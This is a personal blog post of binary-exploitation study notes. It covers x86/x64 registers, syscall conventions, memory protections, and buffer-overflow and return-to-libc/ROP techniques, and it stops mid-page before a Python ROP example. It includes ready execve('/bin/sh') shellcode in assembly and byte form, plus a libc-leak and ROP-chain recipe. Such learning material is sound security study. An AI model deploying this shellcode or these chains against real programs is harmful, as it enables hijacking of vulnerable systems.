<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="ğŸ““ PWN STUDY NOTES" /><meta property="og:locale" content="en" /><meta name="description" content="PWN 101" /><meta property="og:description" content="PWN 101" /><link rel="canonical" href="https://blog.kaytii.me/posts/pwn-study-notes/" /><meta property="og:url" content="https://blog.kaytii.me/posts/pwn-study-notes/" /><meta property="og:site_name" content="KayTii" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-03-23T07:00:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="ğŸ““ PWN STUDY NOTES" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-03-23T07:00:00+07:00","datePublished":"2025-03-23T07:00:00+07:00","description":"PWN 101","headline":"ğŸ““ PWN STUDY NOTES","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.kaytii.me/posts/pwn-study-notes/"},"url":"https://blog.kaytii.me/posts/pwn-study-notes/"}</script><title>ğŸ““ PWN STUDY NOTES | KayTii</title><link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/avt/avt.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">KayTii</a><p class="site-subtitle fst-italic mb-0">Pwnable</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/Kaytii210" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dkhoitran2106','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>ğŸ““ PWN STUDY NOTES</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>ğŸ““ PWN STUDY NOTES</h1><p class="post-desc fw-light mb-4">PWN 101</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1742688000" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Mar 23, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/Kaytii210">Khoi Tran</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2677 words" > <em>14 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">ğŸ““ PWN STUDY NOTES</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">ğŸ““ PWN STUDY NOTES</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h2 id="-computer-architecture--operating-system"><span class="me-2">ğŸ§  Computer Architecture + Operating System</span><a href="#-computer-architecture--operating-system" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="registers"><span class="me-2">Registers</span><a href="#registers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="table-wrapper"><table><thead><tr><th>Register<th>Description<tbody><tr><td><code class="language-plaintext highlighter-rouge">rax</code><td>Function return value â†’ <code class="language-plaintext highlighter-rouge">rax</code>, <code class="language-plaintext highlighter-rouge">eax</code>, <code class="language-plaintext highlighter-rouge">ax</code>, <code class="language-plaintext highlighter-rouge">ah</code>, <code class="language-plaintext highlighter-rouge">al</code> (64/32/16/8/8 bits)<tr><td><code class="language-plaintext highlighter-rouge">rbx</code><td>Base register (no specific use in x64)<tr><td><code class="language-plaintext highlighter-rouge">rcx</code><td>Counter register for loops<tr><td><code class="language-plaintext highlighter-rouge">rdx</code><td>Data register<tr><td><code class="language-plaintext highlighter-rouge">rsi</code><td>Source index (source in data movement)<tr><td><code class="language-plaintext highlighter-rouge">rdi</code><td>Destination index (destination in data movement)<tr><td><code class="language-plaintext highlighter-rouge">rsp</code><td>Stack pointer<tr><td><code class="language-plaintext highlighter-rouge">rbp</code><td>Stack base pointer</table></div><hr /><h3 id="user-space-function-calls-system-v-i386-abi"><span class="me-2">User-space function calls (System V i386 ABI)</span><a href="#user-space-function-calls-system-v-i386-abi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><strong>Arguments:</strong> pushed <strong>right â†’ left</strong> onto the stack. At callee entry: <code class="language-plaintext highlighter-rouge">[esp+4]=arg1</code>, <code class="language-plaintext highlighter-rouge">[esp+8]=arg2</code>, â€¦<li><strong>Return:</strong> <code class="language-plaintext highlighter-rouge">eax</code> (or <code class="language-plaintext highlighter-rouge">edx:eax</code>), FP in <code class="language-plaintext highlighter-rouge">st(0)</code><li><strong>Callee-saved:</strong> <code class="language-plaintext highlighter-rouge">ebx</code>, <code class="language-plaintext highlighter-rouge">esi</code>, <code class="language-plaintext highlighter-rouge">edi</code>, <code class="language-plaintext highlighter-rouge">ebp</code> (and <code class="language-plaintext highlighter-rouge">esp</code>)<li><strong>Caller-saved:</strong> <code class="language-plaintext highlighter-rouge">eax</code>, <code class="language-plaintext highlighter-rouge">ecx</code>, <code class="language-plaintext highlighter-rouge">edx</code><li><strong>Stack alignment:</strong> ABI baseline 4 bytes; SIMD code may realign to 16 bytes in prologue.</ul><hr /><h3 id="linux-i386-syscall-convention-int-0x80"><span class="me-2">Linux i386 <strong>syscall</strong> convention (<code class="language-plaintext highlighter-rouge">int 0x80</code>)</span><a href="#linux-i386-syscall-convention-int-0x80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><strong><code class="language-plaintext highlighter-rouge">eax</code></strong> = syscall number.<li><strong>Args 1â€“6:</strong> <code class="language-plaintext highlighter-rouge">ebx</code>, <code class="language-plaintext highlighter-rouge">ecx</code>, <code class="language-plaintext highlighter-rouge">edx</code>, <code class="language-plaintext highlighter-rouge">esi</code>, <code class="language-plaintext highlighter-rouge">edi</code>, <code class="language-plaintext highlighter-rouge">ebp</code><li><strong>Return:</strong> <code class="language-plaintext highlighter-rouge">eax</code> (â‰¥0 success; <strong>negative</strong> = <code class="language-plaintext highlighter-rouge">-errno</code>)<li>Other regs not guaranteed preserved.</ul><hr /><h3 id="linux-x86-64-syscall-convention-syscall-instruction"><span class="me-2">Linux x86-64 <strong>syscall</strong> convention (<code class="language-plaintext highlighter-rouge">syscall</code> instruction)</span><a href="#linux-x86-64-syscall-convention-syscall-instruction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><strong><code class="language-plaintext highlighter-rouge">rax</code></strong> â€” syscall number.<li><strong>Arguments (1â€“6):</strong> <code class="language-plaintext highlighter-rouge">rdi, rsi, rdx, r10, r8, r9</code><li><strong>Return value:</strong> <code class="language-plaintext highlighter-rouge">rax</code> (â‰¥ 0 on success; <strong>negative</strong> value = <code class="language-plaintext highlighter-rouge">-errno</code>)<li>Other registers are preserved per usual rules (<code class="language-plaintext highlighter-rouge">rbx, rbp, r12â€“r15</code> are callee-saved in user space).</ul><hr /><h3 id="-memory-structure-of-linux-process"><span class="me-2">ğŸ§± MEMORY STRUCTURE OF LINUX PROCESS</span><a href="#-memory-structure-of-linux-process" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><strong>Code Segment (.text):</strong> executable code (râ€“x)<li><strong>Data Segment:</strong> initialized global/static variables (rw-)<li><strong>BSS Segment:</strong> uninitialized global/static variables (rw-)<li><strong>Heap Segment:</strong> dynamic memory allocation (rw-)<li><strong>Stack Segment:</strong> local variables, return addresses (rw-)<li><strong>Extra Segment:</strong> <code class="language-plaintext highlighter-rouge">fs</code> and <code class="language-plaintext highlighter-rouge">gs</code> (used by OS)</ul><hr /><h3 id="ï¸-assembly-basics"><span class="me-2">âš™ï¸ ASSEMBLY BASICS</span><a href="#ï¸-assembly-basics" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="-opcodes"><span class="me-2">ğŸ”¹ Opcodes</span><a href="#-opcodes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>Data Transfer:</strong> <code class="language-plaintext highlighter-rouge">mov</code>, <code class="language-plaintext highlighter-rouge">lea</code><li><strong>Arithmetic:</strong> <code class="language-plaintext highlighter-rouge">inc</code>, <code class="language-plaintext highlighter-rouge">dec</code>, <code class="language-plaintext highlighter-rouge">add</code>, <code class="language-plaintext highlighter-rouge">sub</code><li><strong>Logic:</strong> <code class="language-plaintext highlighter-rouge">and</code>, <code class="language-plaintext highlighter-rouge">or</code>, <code class="language-plaintext highlighter-rouge">xor</code>, <code class="language-plaintext highlighter-rouge">not</code><li><strong>Comparison:</strong> <code class="language-plaintext highlighter-rouge">cmp</code>, <code class="language-plaintext highlighter-rouge">test</code><li><strong>Branch:</strong> <code class="language-plaintext highlighter-rouge">jmp</code>, <code class="language-plaintext highlighter-rouge">je</code>, <code class="language-plaintext highlighter-rouge">jg</code><li><strong>Stack:</strong> <code class="language-plaintext highlighter-rouge">push</code>, <code class="language-plaintext highlighter-rouge">pop</code><li><strong>Procedure:</strong> <code class="language-plaintext highlighter-rouge">call</code>, <code class="language-plaintext highlighter-rouge">ret</code>, <code class="language-plaintext highlighter-rouge">leave</code><li><strong>System call:</strong> <code class="language-plaintext highlighter-rouge">syscall</code></ul><h4 id="-memory-operands"><span class="me-2">ğŸ”¹ Memory Operands</span><a href="#-memory-operands" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><code class="language-plaintext highlighter-rouge">QWORD PTR [addr]</code>: 8 bytes<li><code class="language-plaintext highlighter-rouge">DWORD PTR [addr]</code>: 4 bytes<li><code class="language-plaintext highlighter-rouge">WORD PTR [rax]</code>: 2 bytes<li><code class="language-plaintext highlighter-rouge">BYTE PTR [rax]</code>: 1 byte</ul><p>View more in:</p><ul><li><a href="https://www.geeksforgeeks.org/computer-organization-architecture/computer-organization-and-architecture-tutorials/">Computer Architecture</a><li><a href="https://www.tutorialspoint.com/assembly_programming/index.htm">Assembly</a><li><a href="https://www.tutorialspoint.com/operating_system/index.htm">OS</a></ul><h2 id="-bugs"><span class="me-2">ğŸ› Bugs</span><a href="#-bugs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="-shellcode"><span class="me-2">ğŸš SHELLCODE</span><a href="#-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="-target"><span class="me-2">ğŸ“Œ Target</span><a href="#-target" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Call <code class="language-plaintext highlighter-rouge">execve("/bin/sh", NULL, NULL)</code> to get a shell or control flow of the program.</p><hr /><h4 id="-syscall-convention-for-execvebinsh-0-0-x86_64"><span class="me-2">ğŸ§¬ Syscall convention for execve(/bin/sh, 0, 0) (x86_64)</span><a href="#-syscall-convention-for-execvebinsh-0-0-x86_64" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="table-wrapper"><table><thead><tr><th>Register<th>Role<tbody><tr><td><code class="language-plaintext highlighter-rouge">rax</code><td>Syscall number (<code class="language-plaintext highlighter-rouge">0x3b</code> for <code class="language-plaintext highlighter-rouge">execve</code>)<tr><td><code class="language-plaintext highlighter-rouge">rdi</code><td>arg0: filename (<code class="language-plaintext highlighter-rouge">/bin/sh</code>)<tr><td><code class="language-plaintext highlighter-rouge">rsi</code><td>arg1: argv (NULL)<tr><td><code class="language-plaintext highlighter-rouge">rdx</code><td>arg2: envp (NULL)</table></div><hr /><h4 id="-shellcode-x86_64"><span class="me-2">ğŸ”© Shellcode (x86_64)</span><a href="#-shellcode-x86_64" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><pre><code class="language-asm">mov rax, 0x68732f6e69622f   ; "/bin/sh" in hex
push rax
mov rdi, rsp                ; rdi = pointer to "/bin/sh"
xor rsi, rsi                ; rsi = NULL
xor rdx, rdx                ; rdx = NULL
mov rax, 0x3b               ; rax = syscall number for execve
syscall
</code></pre><p>Little-endian bytes <code class="language-plaintext highlighter-rouge">\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05</code></p><hr /><h4 id="-shellcode-x86"><span class="me-2">ğŸ”© Shellcode (x86)</span><a href="#-shellcode-x86" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><pre><code class="language-asm">xor eax, eax
xor ecx, ecx
xor edx, edx
add eax, 0x0b               ; syscall number for execve
xor ebx, ebx
push ebx
push 0x68732f2f             ; "//sh"
push 0x6e69622f             ; "/bin"
mov ebx, esp
int 0x80                    ; syscall
</code></pre><p>Little-endian bytes <code class="language-plaintext highlighter-rouge">\x31\xC0\x31\xC9\x31\xD2\x83\xC0\x0B\x31\xDB\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80</code></p><h3 id="-buffer-overflow"><span class="me-2">ğŸ’¥ BUFFER OVERFLOW</span><a href="#-buffer-overflow" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="-input-functions-that-can-overflow"><span class="me-2">ğŸ§µ Input functions that can overflow</span><a href="#-input-functions-that-can-overflow" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><h5 id="getsbuf--do-not-use-removed-in-c11"><span class="me-2"><code class="language-plaintext highlighter-rouge">gets(buf)</code> â€” <strong>do not use (removed in C11)</strong></span><a href="#getsbuf--do-not-use-removed-in-c11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><ul><li><strong>No input length limit.</strong><li>Reads until <code class="language-plaintext highlighter-rouge">'\n'</code>, <strong>does not store</strong> the newline.<li>Always appends <code class="language-plaintext highlighter-rouge">'\0'</code>.<li><strong>Extremely unsafe</strong> â†’ classic stack overflow.</ul><h5 id="scanfs-buf"><span class="me-2"><code class="language-plaintext highlighter-rouge">scanf("%s", buf)</code></span><a href="#scanfs-buf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><ul><li><strong>No input length limit.</strong><li>Reads until <code class="language-plaintext highlighter-rouge">" "</code>, <code class="language-plaintext highlighter-rouge">\n</code>, <code class="language-plaintext highlighter-rouge">\t</code>.<li>Behaves like <code class="language-plaintext highlighter-rouge">gets()</code>.</ul><h5 id="scanfwidths-buf"><span class="me-2"><code class="language-plaintext highlighter-rouge">scanf("%[width]s", buf)</code></span><a href="#scanfwidths-buf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><ul><li>Reads up to <code class="language-plaintext highlighter-rouge">width</code> characters.<li>If <code class="language-plaintext highlighter-rouge">width &gt; sizeof(buf) - 1</code> â†’ <strong>may overflow</strong>.<li>Does not guarantee string <strong>null-termination</strong> (<code class="language-plaintext highlighter-rouge">\0</code>).</ul><h5 id="fgetsbuf-len-stream"><span class="me-2"><code class="language-plaintext highlighter-rouge">fgets(buf, len, stream)</code></span><a href="#fgetsbuf-len-stream" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><ul><li>Reads up to <code class="language-plaintext highlighter-rouge">len - 1</code> characters, always appends <code class="language-plaintext highlighter-rouge">\0</code>. If input is longer, the excess remains in <code class="language-plaintext highlighter-rouge">stdin</code>.<li>If input &lt; <code class="language-plaintext highlighter-rouge">len</code>, the remaining part is filled with <code class="language-plaintext highlighter-rouge">\0</code>.<li>If input = <code class="language-plaintext highlighter-rouge">len</code>, the last byte is discarded and <code class="language-plaintext highlighter-rouge">\0</code> is added.<li>May <strong>lose data</strong>, e.g.: 30-byte buffer â†’ can only store 29 characters if <code class="language-plaintext highlighter-rouge">len = 30</code>.<li>If thereâ€™s space, stores <code class="language-plaintext highlighter-rouge">"\n\0"</code>.</ul><h5 id="readfd-buf-len"><span class="me-2"><code class="language-plaintext highlighter-rouge">read(fd, buf, len)</code></span><a href="#readfd-buf-len" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><ul><li>Reads up to <code class="language-plaintext highlighter-rouge">len</code> bytes into <code class="language-plaintext highlighter-rouge">buf</code>.<li>Returns the number of bytes read (â‰¥ 0) or <strong>negative</strong> value on error.<li>Does not guarantee null-termination (<code class="language-plaintext highlighter-rouge">\0</code>).<li>Safe only if <code class="language-plaintext highlighter-rouge">len</code> is <strong>less than or equal</strong> to the sizeof(<code class="language-plaintext highlighter-rouge">buf</code>).</ul><hr /><h4 id="-core-overflow-types"><span class="me-2">ğŸ“Œ Core Overflow types</span><a href="#-core-overflow-types" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>Stack Overflow:</strong> overwrite data on stack (return address, canary, â€¦).<li><strong>Heap Overflow:</strong> overwrites adjacent heap chunks/objects or allocator metadata.<li><strong>Global/Static Overflow:</strong> overwrites global variables or static data (<code class="language-plaintext highlighter-rouge">.data/.bss</code>).<li><strong>Off-by-one:</strong> overwrite one byte beyond buffer boundary, often affecting adjacent data.<li><strong>Out-of-bounds:</strong> access memory outside the allocated buffer.<li><strong>Integer Overflow/Underflow:</strong> occurs when an arithmetic operation produces a value outside the representable range of the integer type.</ul><h3 id="ï¸-canary-stack-smashing-protector"><span class="me-2">ğŸ›¡ï¸ CANARY (Stack Smashing Protector)</span><a href="#ï¸-canary-stack-smashing-protector" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="-purpose"><span class="me-2">ğŸ§  Purpose</span><a href="#-purpose" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>Prevents buffer overflow attacks</strong> by detecting overwrites of sensitive memory regions.<li>If the canary is overwritten â†’ program will <strong>Segmentation fault</strong> and terminate immediately.</ul><hr /><h4 id="-structure"><span class="me-2">ğŸ” Structure</span><a href="#-structure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li>Stored at: <code class="language-plaintext highlighter-rouge">[rbp - 0x8]</code>.<li>Is a sequence of <strong>8 random bytes</strong>, <strong>first byte is always <code class="language-plaintext highlighter-rouge">\x00</code></strong>.</ul><h3 id="-nx--aslr"><span class="me-2">ğŸ”’ NX &amp; ASLR</span><a href="#-nx--aslr" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="-nx-no-execute"><span class="me-2">ğŸš« NX (No-eXecute)</span><a href="#-nx-no-execute" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>Prevents Shellcode:</strong> Blocks execution of code in memory regions not marked as executable.</ul><hr /><h4 id="-aslr-address-space-layout-randomization"><span class="me-2">ğŸ² ASLR (Address Space Layout Randomization)</span><a href="#-aslr-address-space-layout-randomization" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>Goal:</strong> Randomly allocates addresses for stack, heap, shared libraries, â€¦ each time the binary runs.<li><strong>Benefit:</strong> Makes it harder to guess addresses during exploitation.</ul><hr /><h4 id="-hook-overwrite"><span class="me-2">ğŸ”§ Hook Overwrite</span><a href="#-hook-overwrite" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>Idea:</strong> Bypass RELRO by overwriting function pointers (like <code class="language-plaintext highlighter-rouge">malloc()</code>, <code class="language-plaintext highlighter-rouge">free()</code>, <code class="language-plaintext highlighter-rouge">realloc()</code>) with arbitrary addresses to execute malicious code.</ul><h3 id="-pie--relro"><span class="me-2">ğŸ“Œ PIE &amp; RELRO</span><a href="#-pie--relro" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="-pie-position-independent-executable"><span class="me-2">ğŸ”€ PIE (Position-Independent Executable)</span><a href="#-pie-position-independent-executable" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>Goal:</strong> Execute binary with a changing load address (base address), making exploitation harder.<li><strong>Operation:</strong> Each run, the binary is loaded at a random address, making address guessing more complex.</ul><hr /><h4 id="-pic-position-independent-code"><span class="me-2">ğŸ”„ PIC (Position-Independent Code)</span><a href="#-pic-position-independent-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>Goal:</strong> Allows code to run correctly at any memory location.<li><strong>Features:</strong><ul><li>Does not use absolute addresses.<li>Relies on relative addresses (based on <code class="language-plaintext highlighter-rouge">RIP</code> on x86_64) for address calculations.</ul><li><strong>Benefit:</strong> Increases flexibility and safety when programs are loaded at different addresses.</ul><hr /><h4 id="-relro-relocation-read-only"><span class="me-2">ğŸ”— RELRO (RELocation Read-Only)</span><a href="#-relro-relocation-read-only" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>Protection:</strong> Prevents overwriting the address table (GOT) to protect important functions from exploitation.<li><strong>Protection levels:</strong><ul><li><strong>No RELRO:</strong> GOT can be overwritten, easy to exploit.<li><strong>Partial RELRO:</strong> Some parts of GOT are made read-only after initialization.<li><strong>Full RELRO:</strong> Entire GOT is fully protected, very hard to exploit.</ul></ul><h3 id="-r2l-rop"><span class="me-2">ğŸ”„ R2L-ROP</span><a href="#-r2l-rop" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="-basic-concepts"><span class="me-2">ğŸ“Œ Basic concepts</span><a href="#-basic-concepts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>r2l (Return-to-libc):</strong> Uses <code class="language-plaintext highlighter-rouge">ret</code> to call existing libc functions, e.g.: <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>.<li><strong>ROP (Return Oriented Programming):</strong> Uses chains of gadgets (instructions ending with <code class="language-plaintext highlighter-rouge">ret</code>) to control program flow.<li><strong>GOT (Global Offset Table):</strong> Table containing addresses of libc functions (e.g.: <code class="language-plaintext highlighter-rouge">puts</code>).<li><strong>PLT (Procedure Linkage Table):</strong> Used to call functions via GOT.<li>Call a function: func_plt -&gt; func_got -&gt; func_libc</ul><hr /><h4 id="-technical-details"><span class="me-2">ğŸ”§ Technical details</span><a href="#-technical-details" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><p><strong>Padding Return Address:</strong></p><ul><li>Return address is aligned to 16 bytes.<li>I usually add a <code class="language-plaintext highlighter-rouge">ret</code> before gadgets like <code class="language-plaintext highlighter-rouge">pop rdi; ret</code> to avoid errors due to <code class="language-plaintext highlighter-rouge">movaps</code>.</ul><li><p><strong>Finding function addresses:</strong></p><ul><li>Typically, <code class="language-plaintext highlighter-rouge">system</code> is calculated as:<br /> <code class="language-plaintext highlighter-rouge">system = libc_base + offset</code><br /> (see <code class="language-plaintext highlighter-rouge">readelf -s libc.so.6 | grep "system"</code> for exact offset)</ul><li><p><strong>Finding ROP Gadgets:</strong></p><ul><li>Use:<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ROP gadget <span class="nt">--binary</span> filename | <span class="nb">grep</span> <span class="s2">"gadget_to_find"</span>
<span class="c">#search directly in process</span>
pop_rdi_ret <span class="o">=</span> r.find_gadget<span class="o">([</span><span class="s1">'pop rdi'</span>, <span class="s1">'ret'</span><span class="o">])[</span>0] <span class="c"># Find registers ex: pop rdi ; ret</span>
</pre></table></code></div></div><p>Example: find gadget <code class="language-plaintext highlighter-rouge">pop rdi; ret</code> to set argument for <code class="language-plaintext highlighter-rouge">system</code>.<br /> Return to <code class="language-plaintext highlighter-rouge">main</code> to continue exploitation (<code class="language-plaintext highlighter-rouge">e.symbols['main']</code>)</p></ul></ul><hr /><h4 id="-example-on-x64"><span class="me-2">ğŸ“Œ Example on x64</span><a href="#-example-on-x64" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ol><li><p><strong>Leak libc address:</strong></p><ul><li>Use functions like <code class="language-plaintext highlighter-rouge">puts</code> to print the address stored in GOT.<li>Example: use gadget <code class="language-plaintext highlighter-rouge">pop rdi; ret</code> to put the address of <code class="language-plaintext highlighter-rouge">puts@got</code> into rdi and then call <code class="language-plaintext highlighter-rouge">puts(puts@got)</code> (This will print the address of <code class="language-plaintext highlighter-rouge">puts</code> =&gt; Leak libc).<li>Calculation:<ul><li><code class="language-plaintext highlighter-rouge">libc_base = leaked_address - puts_offset (libc.symbols['puts'])</code></ul></ul><li><p><strong>Find address of <code class="language-plaintext highlighter-rouge">system</code> and string <code class="language-plaintext highlighter-rouge">/bin/sh</code>:</strong></p><ul><li><code class="language-plaintext highlighter-rouge">system = libc_base + system_offset</code><li><code class="language-plaintext highlighter-rouge">binsh = libc_base + offset_of_bin_sh</code></ul><li><p><strong>Deploy ROP:</strong></p><ul><li>Use gadget <code class="language-plaintext highlighter-rouge">pop rdi; ret</code> to set argument for <code class="language-plaintext highlighter-rouge">system</code>.<li>Example ROP:<div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far 